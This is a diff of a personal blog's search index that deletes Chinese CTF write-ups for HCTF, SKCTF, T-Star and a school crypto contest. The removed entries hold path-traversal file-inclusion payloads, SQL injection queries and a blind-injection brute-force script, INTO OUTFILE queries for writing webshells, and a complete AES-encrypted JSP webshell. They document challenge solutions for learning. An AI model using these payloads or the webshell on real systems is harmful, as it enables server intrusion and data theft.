@@ -1,183 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>HCTF-web复现</title>
-    <url>/2018/11/13/HCTF-web%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<p>HCTF后的复现以及学习</p>
-<a id="more"></a>
-
-<hr>
-<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell </a>   </p>
-<p>题中源码</p>
-<pre><code>&lt;?php
-    class emmm
-    {
-        public static function checkFile(&amp;$page)
-        {
-            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
-            if (! isset($page) || !is_string($page)) {
-                echo &quot;you can&apos;t                                                                                                               see it&quot;;
-                return false;
-            }
-
-            if (in_array($page, $whitelist)) {
-                return true;
-            }
-
-            $_page = mb_substr(
-                $page,
-                0,
-                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)
-            );
-            if (in_array($_page, $whitelist)) {
-                return true;
-            }
-
-            $_page = urldecode($page);
-            $_page = mb_substr(
-                $_page,
-                0,
-                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)
-            );
-            if (in_array($_page, $whitelist)) {
-                return true;
-            }
-            echo &quot;you can&apos;t see it&quot;;
-            return false;
-        }
-    }
-
-    if (! empty($_REQUEST[&apos;file&apos;])
-        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])
-        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])
-    ) {
-        include $_REQUEST[&apos;file&apos;];
-        exit;
-    } else {
-        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
-    }  
-?&gt;</code></pre><p>一个任意文件读取，但是需要?前的字符为source.php或者hint.php，可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag。   </p>
-<blockquote>
-<p>payload:<br>/index.php?file=hint.php?../../../../../../../../ffffllllaaaagggg 或者:<br>/index.php?file=source.php?../../../../../../../../ffffllllaaaagggg</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SKCTF-Web</title>
-    <url>/2020/01/18/SKCTF-Web/</url>
-    <content><![CDATA[<p>skctf的web题解，适合萌新的难度。</p>
-<a id="more"></a>
-
-<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>修改前端的maxlength为大于3的值，然后填入flag，在源代码中发现</p>
-<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">Wm14aFp5VTNRbU0yWW1JeU4ySmtPVE16WmpGaVlUSmlZbVprWmpnM05qaGlPVEF6TVRJNEpUZEU</span>=</span><br></pre></td></tr></table></figure>
-<p>base64两次解码两次然后url解码一次为：   </p>
-<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">flag&#123;c6bb27bd933f1ba2bbfdf<span class="number">8768b903128</span>&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计-1"></a>代码审计-1</h3><p>extract变量覆盖<br>payload:</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//182.92.64.179:8003/?id=&amp;content=</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>flag{pHP_1s_s0_EAsyyyy}</p>
-</blockquote>
-<h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计-2"></a>代码审计-2</h3><p>解法1-弱类型绕过：</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">login=<span class="number">1</span>&amp;username[]=<span class="number">1</span>&amp;password[]=<span class="number">2</span>&amp;id=<span class="number">15.00</span></span><br></pre></td></tr></table></figure>
-<p>解法2-md5碰撞加弱类型绕过   </p>
-<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">login=<span class="number">1</span>&amp;username=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;password=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span>&amp;id=<span class="number">15.00</span></span><br></pre></td></tr></table></figure>
-<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>是CVE-2018-12613<br>解法：<br>源代码给出了一个code.php与flag的位置:f1ag_fjsdhjhs121,进入code.php</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"code"</span>=&gt;<span class="string">"code.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<p>code.php中的checkfile函数，工作原理大致如下:   </p>
-<blockquote>
-<p>1.定义一个白名单，里面包括了code.php<br>2.判断page是否为空或字符串，返回true。</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>T-Star高校挑战赛</title>
-    <url>/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
-    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>又是当废物躺了一天的比赛，10个web做了3个，其余6个都是队友做的，还有一个sql1最后也没做出来。也是第一次在ctf比赛中获得第一，纪念一下，感谢队友带飞。wp写的较为简陋。</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x00_0.png" alt="0x00_0.png"></p>
-<h3 id="0x01-赛题"><a href="#0x01-赛题" class="headerlink" title="0x01 赛题"></a>0x01 赛题</h3><h4 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h4><p>就一个前端验证，抓包改后缀就行</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_1.png" alt="0x01_1.png">            </p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_2.png" alt="0x01_2.png">            </p>
-<p>连上shell得到flag</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x01_3.png" alt="0x01_3.png">            </p>
-<h4 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h4><p>直接用 | 来绕过，成功命令执行</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x02_1.png" alt="0x02_1.png">            </p>
-<h4 id="你能爆破吗？"><a href="#你能爆破吗？" class="headerlink" title="你能爆破吗？"></a>你能爆破吗？</h4><p>sqli-libs 21关原题</p>
-<p>使用admin  admin登录后 查看cookie有个base64编码后的用户名，结合提示知道是注入，将注入语句base64编码后传入。经过测试发现没有过滤，测试出字段数为3。</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_1.png" alt="0x03_1.png">            </p>
-<p>将下列语句base64后传入，查表名：</p>
-<p><code>0&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#</code></p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_2.png" alt="0x03_2.png">            </p>
-<p>将下列语句base64后传入，查列名：</p>
-<p><code>0&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()#</code></p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_3.png" alt="0x03_3.png">            </p>
-<p>查flag</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x03_4.png" alt="0x03_4.png">            </p>
-<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>经过fuzz发现，双写&lt;?和eval可以绕过他的文本替换，然后pht可以上传</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_1.png" alt="0x04_1.png">            </p>
-<p>然后访问发现看不到我们写入的一句话，说明解析成功</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_2.png" alt="0x04_2.png">            </p>
-<p>通过php的system执行命令，得到flag</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x04_3.png" alt="0x04_3.png">            </p>
-<h4 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h4><p>查看源码，发现了lfi.txt</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_1.png" alt="0x05_1.png">            </p>
-<p>查看lfi.txt，发现可以文件包含           </p>
-<p> <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_2.png" alt="0x05_2.png">            </p>
-<p>准备一个zip文件，里面是s.php，具体如下，并且重命名为s.txt，然后上传</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_3.png" alt="0x05_3.png">            </p>
-<p>通zip协议成功执行命令</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_4.png" alt="0x05_4.png">            </p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x05_5.png" alt="0x05_5.png"></p>
-<p>​            </p>
-<h4 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h4><p>好像是bugku的原题吧，太简单了就不写了</p>
-<p>最后查询flag:</p>
-<p><code>0&#39; union select 1,2,3,flag from fl4g#</code></p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x06_1.png" alt="0x06_1.png">            </p>
-<h4 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h4><p>直接拿poc打，写入一句话</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,javax.crypto.*,javax.crypto.spec.*"</span>%&gt;&lt;%!<span class="class"><span class="keyword">class</span> <span class="title">U</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;<span class="keyword">super</span>(c);&#125;<span class="function"><span class="keyword">public</span> Class <span class="title">g</span><span class="params">(<span class="keyword">byte</span> []b)</span></span>&#123;<span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="keyword">if</span>(request.getParameter(<span class="string">"pass"</span>)!=<span class="keyword">null</span>)&#123;String k=(<span class="string">""</span>+UUID.randomUUID()).replace(<span class="string">"-"</span>,<span class="string">""</span>).substring(<span class="number">16</span>);session.putValue(<span class="string">"u"</span>,k);out.print(k);<span class="keyword">return</span>;&#125;Cipher c=Cipher.getInstance(<span class="string">"AES"</span>);c.init(<span class="number">2</span>,<span class="keyword">new</span> SecretKeySpec((session.getValue(<span class="string">"u"</span>)+<span class="string">""</span>).getBytes(),<span class="string">"AES"</span>));<span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(c.doFinal(<span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_1.png" alt="0x07_1.png">            </p>
-<p>然后访问木马，发现写入成功</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_2.png" alt="0x07_2.png">            </p>
-<p>连上一句话，得到flag</p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_3.png" alt="0x07_3.png">            </p>
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x07_4.png" alt="0x07_4.png">            </p>
-<h4 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h4><p>可能是非预期？反正我们7字符5字符都没成功。</p>
-<p>写入shell基本是不成功的，因为有index.php的干扰，所以用cat命令读上一级目录的key，先写入cat</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_1.png" alt="0x08_1.png"></p>
-<p>然后看到key是在上层目录</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_2.png" alt="0x08_2.png"></p>
-<p>然后直接使用cat来读取 <code>* ../*</code></p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x08_3.png" alt="0x08_3.png"></p>
-<h4 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h4><p>这里听群里的师傅说是limit注入写文件，查了一下官方文档</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_1.png" alt="0x10_1.png"></p>
-<p>在设置了secure_file_priv的情况下，就可以直接写shell了，猜一个路径(通常就是/var/www/html)</p>
-<p>贴几个payload。</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines terminated <span class="keyword">by</span>  （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> fields terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> <span class="keyword">columns</span> terminated <span class="keyword">by</span> （一句话hex编码）</span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">'物理路径'</span> lines starting <span class="keyword">by</span>    （一句话hex编码）</span><br></pre></td></tr></table></figure>
-
-<p>至于某群友说低版本才行，经过查阅文档发现都行，上图就是mysql8.0的文档，所以总结就是只要能够写文件，就能limit后面进行注入(有错误的话欢迎师傅们指正)。</p>
-<p>以下为测试的两个版本，只需要开启secure-file-priv就可以进行limit写shell了</p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_2.png" alt="0x10_2.png"></p>
-<p> <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x10_3.png" alt="0x10_3.png"> </p>
-<h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><p>目录扫描到wwwroot.zip，发现过滤的比较死，猜测账号密码图片都在同一个数据库表中，脚本如下。</p>
-<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="selector-tag">a</span> =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="title">while</span><span class="params">(<span class="number">1</span>)</span></span>:</span><br><span class="line">    <span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="selector-tag">a</span>:</span><br><span class="line">        url = <span class="string">'http://23dcf1dc.yunyansec.com/picture.php?id=3" or password REGEXP '</span>+<span class="string">'\'^'</span>+temp+i+<span class="string">'\' %23'</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'not found'</span> not <span class="keyword">in</span> r<span class="selector-class">.text</span>:</span><br><span class="line">            temp = temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
-
-<p>​            <img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_1.png" alt="0x09_1.png">            </p>
-<p> 二十位的hash？可能是dedecms，然后去掉前三位跟后三位然后somd5解密 </p>
-<p><img src="/2020/06/30/T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B/0x09_2.png" alt="0x09_2.png"></p>
-<p> 然后登陆拿到flag </p>
-<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>总体来说还算比较简单，早期起来晚了，要不然还能抢几个题，等我起来一上号队友都已经在屠榜了(淦</p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>DOM,BOM</title>
     <url>/2018/10/22/DOM-BOM/</url>
     <content><![CDATA[<p>关于DOM与BOM的简介</p>
@@ -189,94 +12,6 @@
 ]]></content>
       <tags>
         <tag>web FE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cdusec-ctf Crypto wp</title>
-    <url>/2018/11/18/cdusec-ctf-Crypto-wp/</url>
-    <content><![CDATA[<p>校赛Crypto的wp，这些题都比较简单吧，大多都能查得到，只是一些简单古典密码以及常见编码。</p>
-<a id="more"></a>
-
-<h3 id="1、签到"><a href="#1、签到" class="headerlink" title="1、签到"></a>1、签到</h3><p>复制输入即可，我给了一个链接，没有认真去看的23333 吃亏。</p>
-<h3 id="2、凯撒"><a href="#2、凯撒" class="headerlink" title="2、凯撒"></a>2、凯撒</h3><p>简单的凯撒加密，key为4，在线工具丢进去即可。</p>
-<h3 id="3、fuck！这是什么鬼"><a href="#3、fuck！这是什么鬼" class="headerlink" title="3、fuck！这是什么鬼"></a>3、fuck！这是什么鬼</h3><p>jsfuck,说到底也是js代码，一样能够像js一样执行，复制丢进浏览器的控制台就得flag。</p>
-<h3 id="4、不一样的morse"><a href="#4、不一样的morse" class="headerlink" title="4、不一样的morse"></a>4、不一样的morse</h3><p>morse的中文编码xmorse，在线网站丢进去完事。</p>
-<h3 id="5、你熟悉键盘吗？"><a href="#5、你熟悉键盘吗？" class="headerlink" title="5、你熟悉键盘吗？"></a>5、你熟悉键盘吗？</h3><p>一共5组字符串，一个字符串代表一个字母，在键盘上比划一下可以得到ANgLA。</p>
-<h3 id="6、蕾蕾姐被表白了"><a href="#6、蕾蕾姐被表白了" class="headerlink" title="6、蕾蕾姐被表白了"></a>6、蕾蕾姐被表白了</h3><p>手机的9键拼音输入法加密，每2个数字对应一个字符，例如33，表示第三个键，第三个字符，即f，其他一样然后解出flag。</p>
-<h3 id="7、奇怪的字符串"><a href="#7、奇怪的字符串" class="headerlink" title="7、奇怪的字符串"></a>7、奇怪的字符串</h3><p>Y对应1，N对应0，全部替换后二进制转字符串。</p>
-<h3 id="8、the-other-base’s-member"><a href="#8、the-other-base’s-member" class="headerlink" title="8、the other base’s member"></a>8、the other base’s member</h3><p>base58，在线网站解码即可。</p>
-<h3 id="9、easy-base-family"><a href="#9、easy-base-family" class="headerlink" title="9、easy_base_family"></a>9、easy_base_family</h3><p>base16，32，64混合编码，解码脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'base_family.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b16decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b32decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b64decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-<h3 id="10、蕾蕾姐的id"><a href="#10、蕾蕾姐的id" class="headerlink" title="10、蕾蕾姐的id"></a>10、蕾蕾姐的id</h3><p>md5爆破，会有多解的情况，只有一个正确。解密脚本：</p>
